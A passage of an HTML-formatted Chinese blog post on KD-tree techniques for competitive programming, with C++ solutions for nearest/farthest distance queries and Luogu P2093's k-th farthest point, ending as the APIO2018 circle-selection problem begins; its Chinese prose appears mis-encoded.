class="line">	<span class="keyword">return</span> <span class="built_in">ABS</span>(t[p].d[<span class="number">0</span>]-X)+<span class="built_in">ABS</span>(t[p].d[<span class="number">1</span>]-Y);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">dismatrixmin</span><span class="params">(<span class="type">int</span> p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">int</span> res=<span class="number">0</span>;</span><br><span class="line">	res+=<span class="built_in">max</span>((<span class="type">long</span> <span class="type">long</span>)<span class="number">0</span>,X-t[p].mx[<span class="number">0</span>])+<span class="built_in">max</span>((<span class="type">long</span> <span class="type">long</span>)<span class="number">0</span>,t[p].mn[<span class="number">0</span>]-X);</span><br><span class="line">	res+=<span class="built_in">max</span>((<span class="type">long</span> <span class="type">long</span>)<span class="number">0</span>,Y-t[p].mx[<span class="number">1</span>])+<span class="built_in">max</span>((<span class="type">long</span> <span class="type">long</span>)<span class="number">0</span>,t[p].mn[<span class="number">1</span>]-Y);</span><br><span class="line">	<span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">dismatrixmax</span><span class="params">(<span class="type">int</span> p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">int</span> res=<span class="number">0</span>;</span><br><span class="line">	res+=<span class="built_in">max</span>((<span class="type">long</span> <span class="type">long</span>)<span class="number">0</span>,t[p].mx[<span class="number">0</span>]-X)+<span class="built_in">max</span>((<span class="type">long</span> <span class="type">long</span>)<span class="number">0</span>,X-t[p].mn[<span class="number">0</span>]);</span><br><span class="line">	res+=<span class="built_in">max</span>((<span class="type">long</span> <span class="type">long</span>)<span class="number">0</span>,t[p].mx[<span class="number">1</span>]-Y)+<span class="built_in">max</span>((<span class="type">long</span> <span class="type">long</span>)<span class="number">0</span>,Y-t[p].mn[<span class="number">1</span>]);</span><br><span class="line">	<span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">querymin</span><span class="params">(<span class="type">int</span> p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(!t[p].del)mindis=<span class="built_in">min</span>(mindis,<span class="built_in">dis</span>(p));</span><br><span class="line">	<span class="type">int</span> dl=INF,dr=INF;</span><br><span class="line">	<span class="keyword">if</span>(t[p].ls)dl=<span class="built_in">dismatrixmin</span>(t[p].ls);</span><br><span class="line">	<span class="keyword">if</span>(t[p].rs)dr=<span class="built_in">dismatrixmin</span>(t[p].rs);</span><br><span class="line">	<span class="keyword">if</span>(dl&lt;dr)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span>(dl&lt;mindis)<span class="built_in">querymin</span>(t[p].ls);</span><br><span class="line">		<span class="keyword">if</span>(dr&lt;mindis)<span class="built_in">querymin</span>(t[p].rs);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span>(dr&lt;mindis)<span class="built_in">querymin</span>(t[p].rs);</span><br><span class="line">		<span class="keyword">if</span>(dl&lt;mindis)<span class="built_in">querymin</span>(t[p].ls);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">querymax</span><span class="params">(<span class="type">int</span> p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(!t[p].del)maxdis=<span class="built_in">max</span>(maxdis,<span class="built_in">dis</span>(p));</span><br><span class="line">	<span class="type">int</span> dl=-INF,dr=-INF;</span><br><span class="line">	<span class="keyword">if</span>(t[p].ls)dl=<span class="built_in">dismatrixmax</span>(t[p].ls);</span><br><span class="line">	<span class="keyword">if</span>(t[p].rs)dr=<span class="built_in">dismatrixmax</span>(t[p].rs);</span><br><span class="line">	<span class="keyword">if</span>(dl&gt;dr)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span>(dl&gt;maxdis)<span class="built_in">querymax</span>(t[p].ls);</span><br><span class="line">		<span class="keyword">if</span>(dr&gt;maxdis)<span class="built_in">querymax</span>(t[p].rs);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span>(dr&gt;maxdis)<span class="built_in">querymax</span>(t[p].rs);</span><br><span class="line">		<span class="keyword">if</span>(dl&gt;maxdis)<span class="built_in">querymax</span>(t[p].ls);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">signed</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">int</span> n,root=<span class="number">0</span>,ans=INF;</span><br><span class="line">	<span class="built_in">read</span>(n);</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;i++)<span class="built_in">read</span>(ori[i].d[<span class="number">0</span>]),<span class="built_in">read</span>(ori[i].d[<span class="number">1</span>]);</span><br><span class="line">	root=<span class="built_in">build</span>(<span class="number">1</span>,n,<span class="number">0</span>);</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		t[i].del=<span class="number">1</span>;</span><br><span class="line">		X=t[i].d[<span class="number">0</span>],Y=t[i].d[<span class="number">1</span>];</span><br><span class="line">		maxdis=-INF,mindis=INF;</span><br><span class="line">		<span class="built_in">querymin</span>(root),<span class="built_in">querymax</span>(root);</span><br><span class="line">		<span class="comment">/*cout&lt;&lt;t[i].mn[0]&lt;&lt;&quot; &quot;&lt;&lt;t[i].mn[1]&lt;&lt;&quot; &quot;&lt;&lt;t[i].mx[0]&lt;&lt;&quot; &quot;&lt;&lt;t[i].mx[1]&lt;&lt;endl;</span></span><br><span class="line"><span class="comment">		cout&lt;&lt;&quot;ls&quot;&lt;&lt;t[i].ls&lt;&lt;endl;</span></span><br><span class="line"><span class="comment">		cout&lt;&lt;&quot;rs&quot;&lt;&lt;t[i].rs&lt;&lt;endl;*/</span></span><br><span class="line">		ans=<span class="built_in">min</span>(ans,maxdis-mindis);</span><br><span class="line">		t[i].del=<span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	cout&lt;&lt;ans&lt;&lt;endl;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="k-è¿œè·ç¦»æŸ¥è¯¢"><a href="#k-è¿œè·ç¦»æŸ¥è¯¢" class="headerlink" title="$k$ è¿œè·ç¦»æŸ¥è¯¢"></a>$k$ è¿œè·ç¦»æŸ¥è¯¢</h3><h4 id="æ´›è°·-P2093-å›½å®¶é›†è®­é˜Ÿ-JZPFAR"><a href="#æ´›è°·-P2093-å›½å®¶é›†è®­é˜Ÿ-JZPFAR" class="headerlink" title="æ´›è°· P2093 [å›½å®¶é›†è®­é˜Ÿ] JZPFAR"></a>æ´›è°· P2093 [å›½å®¶é›†è®­é˜Ÿ] JZPFAR</h4><p>äºŒç»´å¹³é¢ä¸Šæœ‰ $n$ ä¸ªç‚¹ $(x,y)$ï¼Œç°æœ‰ $m$ æ¬¡è¯¢é—®ï¼Œæ¯æ¬¡è¯¢é—®ç»™å‡ºä¸€ä¸ªç‚¹ $(px,py)$ ä»¥åŠ $k$ï¼ŒæŸ¥è¯¢è¿™ $n$ ä¸ªç‚¹ä¸­åˆ°ç‚¹ $(px,py)$ çš„è·ç¦»ç¬¬ $k$ å¤§çš„ç‚¹çš„ç¼–å·ã€‚å¦‚æœæœ‰å¤šä¸ªç‚¹åˆ° $(px,py)$ çš„è·ç¦»ç›¸åŒï¼Œé‚£ä¹ˆè®¤å®šç¼–å·è¾ƒå°çš„ç‚¹è·ç¦»è¾ƒå¤§ã€‚</p>
<p><strong>æœ¬é¢˜ä¸­ï¼Œè·ç¦»æŒ‡æ¬§å‡ é‡Œå¾—è·ç¦»</strong>ï¼Œå³ $dist(A,B)&#x3D;\sqrt {(A_x-B_x)^2+(A_y-B_y)^2}$</p>
<p>æ˜¯ä¸ªéº»çƒ¦é¢˜ã€‚é¦–å…ˆï¼Œä¸ºäº†æ–¹ä¾¿ï¼Œæˆ‘ä»¬åœ¨è®¡ç®—è·ç¦»æ—¶å¯ä»¥ä¸ç”¨å¼€æ–¹ï¼Œä¸å½±å“ç­”æ¡ˆã€‚</p>
<p>ç”±äºæ²¡æœ‰æ’å…¥æ“ä½œï¼Œé™æ€å»ºæ ‘å³å¯ã€‚</p>
<p>æŸ¥è¯¢æœ€å¤§è·ç¦»å°±ä¸ç”¨è¯´äº†ï¼Œä¹‹å‰æè¿‡äº†ï¼Œç°åœ¨è€ƒè™‘æ€ä¹ˆç»Ÿè®¡ç¬¬ $k$ è¿œã€‚</p>
<p>æˆ‘ä»¬å¯ä»¥å¼€ä¸€ä¸ª <strong>å°æ ¹å †</strong>ï¼Œå…ˆæ’å…¥ $k$ ä¸ªæå°å€¼ï¼Œç„¶åä»æ ¹èŠ‚ç‚¹å¼€å§‹æŸ¥è¯¢ï¼Œå¦‚æœ $(px,py)$ åˆ°å½“å‰èŠ‚ç‚¹çš„è·ç¦»å¤§äºå †é¡¶å­˜çš„è·ç¦»ï¼Œæˆ–è€… $(px,py)$ åˆ°å½“å‰èŠ‚ç‚¹çš„è·ç¦»ç­‰äºå †é¡¶å­˜çš„è·ç¦»ï¼Œä½†æ˜¯è¯¥ç‚¹ç¼–å·å°äºå †é¡¶å­˜çš„ç¼–å·ï¼Œæˆ‘ä»¬å°±å¼¹å‡ºå †é¡¶ï¼ŒæŠŠç°åœ¨è¿™ä¸ªç‚¹åˆ° $(px,py)$ çš„è·ç¦»å’Œè¿™ä¸ªç‚¹çš„ç¼–å·ä¸¢è¿›å»ã€‚æŸ¥è¯¢ç»“æŸåï¼Œå †é¡¶å­˜çš„ç¼–å·å°±æ˜¯ç­”æ¡ˆã€‚</p>
<p>å…·ä½“è¿‡ç¨‹å¦‚ä¸‹ï¼š</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">ans</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> dis,id;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">bool</span> <span class="keyword">operator</span> &lt;(ans a,ans b)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span>(a.dis==b.dis)<span class="keyword">return</span> a.id&lt;b.id;</span><br><span class="line">	<span class="keyword">return</span> a.dis&gt;b.dis;</span><br><span class="line">&#125;</span><br><span class="line">priority_queue&lt;ans&gt;q;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">query</span><span class="params">(<span class="type">int</span> p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(!p)<span class="keyword">return</span>;</span><br><span class="line">	<span class="type">int</span> dis=<span class="built_in">getdis</span>(t[p].d[<span class="number">0</span>],t[p].d[<span class="number">1</span>],X,Y);<span class="comment">//è·å–å½“å‰ç‚¹åˆ°æŸ¥è¯¢ç‚¹çš„è·ç¦»</span></span><br><span class="line">	<span class="keyword">if</span>(dis&gt;q.<span class="built_in">top</span>().dis || (dis==q.<span class="built_in">top</span>().dis &amp;&amp; t[p].id&lt;q.<span class="built_in">top</span>().id))<span class="comment">//è·ç¦»æ›´è¿œ</span></span><br><span class="line">	&#123;</span><br><span class="line">		q.<span class="built_in">pop</span>();</span><br><span class="line">		q.<span class="built_in">push</span>(&#123;dis,t[p].id&#125;);<span class="comment">//æŠŠæ›´è¿œçš„ä¸¢è¿›å †</span></span><br><span class="line">	&#125;</span><br><span class="line">    <span class="comment">//å‰ªæä¼˜åŒ–</span></span><br><span class="line">	<span class="type">int</span> dl=-INF,dr=-INF;</span><br><span class="line">	<span class="keyword">if</span>(t[p].ls)dl=<span class="built_in">dismatrix</span>(t[p].ls);</span><br><span class="line">	<span class="keyword">if</span>(t[p].rs)dr=<span class="built_in">dismatrix</span>(t[p].rs);</span><br><span class="line">	<span class="keyword">if</span>(dl&gt;dr)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span>(dl&gt;=q.<span class="built_in">top</span>().dis)<span class="built_in">query</span>(t[p].ls);</span><br><span class="line">		<span class="keyword">if</span>(dr&gt;=q.<span class="built_in">top</span>().dis)<span class="built_in">query</span>(t[p].rs);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span>(dr&gt;=q.<span class="built_in">top</span>().dis)<span class="built_in">query</span>(t[p].rs);</span><br><span class="line">		<span class="keyword">if</span>(dl&gt;=q.<span class="built_in">top</span>().dis)<span class="built_in">query</span>(t[p].ls);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>å®Œæ•´ä»£ç  </p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> int long long</span></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> MAX=<span class="number">1e6</span>+<span class="number">5</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> INF=<span class="number">1e18</span>;</span><br><span class="line"><span class="function"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T&gt;</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">read</span><span class="params">(T &amp;x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	x=<span class="number">0</span>;</span><br><span class="line">	<span class="type">int</span> f=<span class="number">1</span>;</span><br><span class="line">	<span class="type">char</span> ch=<span class="built_in">getchar</span>();</span><br><span class="line">	<span class="keyword">while</span>(!<span class="built_in">isdigit</span>(ch))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span>(ch==<span class="string">&#x27;-&#x27;</span>)f=<span class="number">-1</span>;</span><br><span class="line">		ch=<span class="built_in">getchar</span>();</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">while</span>(<span class="built_in">isdigit</span>(ch))</span><br><span class="line">	&#123;</span><br><span class="line">		x=x*<span class="number">10</span>+(ch^<span class="number">48</span>);</span><br><span class="line">		ch=<span class="built_in">getchar</span>();</span><br><span class="line">	&#125;</span><br><span class="line">	x*=f;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">node</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> d[<span class="number">2</span>],mx[<span class="number">2</span>],mn[<span class="number">2</span>];</span><br><span class="line">	<span class="type">int</span> ls,rs;</span><br><span class="line">	<span class="type">int</span> id;</span><br><span class="line">&#125;t[MAX],ori[MAX];</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">ans</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> dis,id;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">bool</span> <span class="keyword">operator</span> &lt;(ans a,ans b)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span>(a.dis==b.dis)<span class="keyword">return</span> a.id&lt;b.id;</span><br><span class="line">	<span class="keyword">return</span> a.dis&gt;b.dis;</span><br><span class="line">&#125;</span><br><span class="line">priority_queue&lt;ans&gt;q;</span><br><span class="line"><span class="type">int</span> K=<span class="number">0</span>,X,Y;</span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">cmp</span><span class="params">(node a,node b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> a.d[K]&lt;b.d[K];</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">update</span><span class="params">(<span class="type">int</span> p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">int</span> ls=t[p].ls;</span><br><span class="line">	<span class="type">int</span> rs=t[p].rs;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;=<span class="number">1</span>;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		t[p].mx[i]=t[p].mn[i]=t[p].d[i];</span><br><span class="line">		<span class="keyword">if</span>(ls)</span><br><span class="line">		&#123;</span><br><span class="line">			t[p].mx[i]=<span class="built_in">max</span>(t[p].mx[i],t[ls].mx[i]);</span><br><span class="line">			t[p].mn[i]=<span class="built_in">min</span>(t[p].mn[i],t[ls].mn[i]);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(rs)</span><br><span class="line">		&#123;</span><br><span class="line">			t[p].mx[i]=<span class="built_in">max</span>(t[p].mx[i],t[rs].mx[i]);</span><br><span class="line">			t[p].mn[i]=<span class="built_in">min</span>(t[p].mn[i],t[rs].mn[i]);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">build</span><span class="params">(<span class="type">int</span> l,<span class="type">int</span> r,<span class="type">int</span> k)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(l&gt;r)<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	K=k;</span><br><span class="line">	<span class="type">int</span> mid=(l+r)&gt;&gt;<span class="number">1</span>;</span><br><span class="line">	<span class="built_in">nth_element</span>(ori+l,ori+mid,ori+r+<span class="number">1</span>,cmp);</span><br><span class="line">	t[mid]=ori[mid];</span><br><span class="line">	t[mid].ls=<span class="built_in">build</span>(l,mid<span class="number">-1</span>,k^<span class="number">1</span>);</span><br><span class="line">	t[mid].rs=<span class="built_in">build</span>(mid+<span class="number">1</span>,r,k^<span class="number">1</span>);</span><br><span class="line">	<span class="built_in">update</span>(mid);</span><br><span class="line">	<span class="keyword">return</span> mid;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">getdis</span><span class="params">(<span class="type">int</span> x1,<span class="type">int</span> y1,<span class="type">int</span> x2,<span class="type">int</span> y2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">int</span> k1=(x1-x2)*(x1-x2);</span><br><span class="line">	<span class="type">int</span> k2=(y1-y2)*(y1-y2);</span><br><span class="line">	<span class="keyword">return</span> k1+k2;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">dismatrix</span><span class="params">(<span class="type">int</span> p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">int</span> dis=-INF;</span><br><span class="line">	dis=<span class="built_in">max</span>(dis,<span class="built_in">getdis</span>(t[p].mn[<span class="number">0</span>],t[p].mn[<span class="number">1</span>],X,Y));</span><br><span class="line">	dis=<span class="built_in">max</span>(dis,<span class="built_in">getdis</span>(t[p].mx[<span class="number">0</span>],t[p].mn[<span class="number">1</span>],X,Y));</span><br><span class="line">	dis=<span class="built_in">max</span>(dis,<span class="built_in">getdis</span>(t[p].mx[<span class="number">0</span>],t[p].mx[<span class="number">1</span>],X,Y));</span><br><span class="line">	dis=<span class="built_in">max</span>(dis,<span class="built_in">getdis</span>(t[p].mn[<span class="number">0</span>],t[p].mx[<span class="number">1</span>],X,Y));</span><br><span class="line">	<span class="keyword">return</span> dis;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">query</span><span class="params">(<span class="type">int</span> p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(!p)<span class="keyword">return</span>;</span><br><span class="line">	<span class="type">int</span> dis=<span class="built_in">getdis</span>(t[p].d[<span class="number">0</span>],t[p].d[<span class="number">1</span>],X,Y);</span><br><span class="line">	<span class="keyword">if</span>(dis&gt;q.<span class="built_in">top</span>().dis || (dis==q.<span class="built_in">top</span>().dis &amp;&amp; t[p].id&lt;q.<span class="built_in">top</span>().id))</span><br><span class="line">	&#123;</span><br><span class="line">		q.<span class="built_in">pop</span>();</span><br><span class="line">		q.<span class="built_in">push</span>(&#123;dis,t[p].id&#125;);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="type">int</span> dl=-INF,dr=-INF;</span><br><span class="line">	<span class="keyword">if</span>(t[p].ls)dl=<span class="built_in">dismatrix</span>(t[p].ls);</span><br><span class="line">	<span class="keyword">if</span>(t[p].rs)dr=<span class="built_in">dismatrix</span>(t[p].rs);</span><br><span class="line">	<span class="keyword">if</span>(dl&gt;dr)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span>(dl&gt;=q.<span class="built_in">top</span>().dis)<span class="built_in">query</span>(t[p].ls);</span><br><span class="line">		<span class="keyword">if</span>(dr&gt;=q.<span class="built_in">top</span>().dis)<span class="built_in">query</span>(t[p].rs);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span>(dr&gt;=q.<span class="built_in">top</span>().dis)<span class="built_in">query</span>(t[p].rs);</span><br><span class="line">		<span class="keyword">if</span>(dl&gt;=q.<span class="built_in">top</span>().dis)<span class="built_in">query</span>(t[p].ls);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">signed</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">int</span> n,m,k;</span><br><span class="line">	<span class="built_in">read</span>(n);</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;<span class="built_in">read</span>(ori[i].d[<span class="number">0</span>]),<span class="built_in">read</span>(ori[i].d[<span class="number">1</span>]);ori[i].id=i;&#125;</span><br><span class="line">	<span class="type">int</span> root=<span class="built_in">build</span>(<span class="number">1</span>,n,<span class="number">0</span>);</span><br><span class="line">	<span class="built_in">read</span>(m);</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=m;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">read</span>(X),<span class="built_in">read</span>(Y),<span class="built_in">read</span>(k);</span><br><span class="line">		<span class="keyword">while</span>(!q.<span class="built_in">empty</span>())q.<span class="built_in">pop</span>();</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=k;i++)q.<span class="built_in">push</span>(&#123;-INF,INF&#125;);</span><br><span class="line">		<span class="built_in">query</span>(root);</span><br><span class="line">		cout&lt;&lt;q.<span class="built_in">top</span>().id&lt;&lt;endl;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="åœ†çš„ç›¸äº¤é—®é¢˜"><a href="#åœ†çš„ç›¸äº¤é—®é¢˜" class="headerlink" title="åœ†çš„ç›¸äº¤é—®é¢˜"></a>åœ†çš„ç›¸äº¤é—®é¢˜</h3><h4 id="æ´›è°·-P4631-APIO2018-é€‰åœ†åœˆ"><a href="#æ´›è°·-P4631-APIO2018-é€‰åœ†åœˆ" class="headerlink" title="æ´›è°· P4631 [APIO2018] é€‰åœ†åœˆ"></a>æ´›è°· P4631 [APIO2018] é€‰åœ†åœˆ</h4><p>åœ¨äºŒç»´å¹³é¢ä¸Šï¼Œæœ‰ $n$ ä¸ªåœ†ï¼Œè®°ä¸º $c_1,c_2,â€¦,c_n$ã€‚æ‰§è¡Œä»¥ä¸‹æ“ä½œï¼š</p>
<ol>
<li>æ‰¾åˆ°è¿™äº›åœ†ä¸­åŠå¾„æœ€å¤§çš„ã€‚å¦‚æœæœ‰å¤šä¸ªåŠå¾„æœ€å¤§çš„åœ†ï¼Œé€‰æ‹©ç¼–å·æœ€å°çš„ã€‚è®°ä¸º $c_i$ã€‚</li>
<li>åˆ é™¤ $c_i$ åŠä¸å…¶æœ‰äº¤é›†çš„æ‰€æœ‰åœ†ã€‚ä¸¤ä¸ªåœ†æœ‰äº¤é›†å½“ä¸”ä»…å½“å¹³é¢ä¸Šå­˜åœ¨ä¸€ä¸ªç‚¹ï¼Œè¿™ä¸ªç‚¹åŒæ—¶åœ¨è¿™ä¸¤ä¸ªåœ†çš„åœ†å‘¨ä¸Šæˆ–åœ†å†…ã€‚</li>
<li>é‡å¤ä¸Šé¢ä¸¤ä¸ªæ­¥éª¤ç›´åˆ°æ‰€æœ‰çš„åœ†éƒ½è¢«åˆ é™¤ã€‚</li>
</ol>
<p>å½“ $c_i$ è¢«åˆ é™¤æ—¶ï¼Œè‹¥å¾ªç¯ä¸­ç¬¬ $1$ æ­¥é€‰æ‹©çš„åœ†æ˜¯ $c_j$ï¼Œæˆ‘ä»¬è¯´ $c_i$è¢« $c_j$ åˆ é™¤ã€‚å¯¹äºæ¯ä¸ªåœ†ï¼Œæ±‚å‡ºå®ƒæ˜¯è¢«å“ªä¸€ä¸ªåœ†åˆ é™¤çš„ã€‚</p>
<p>æ ·ä¾‹ï¼š</p>
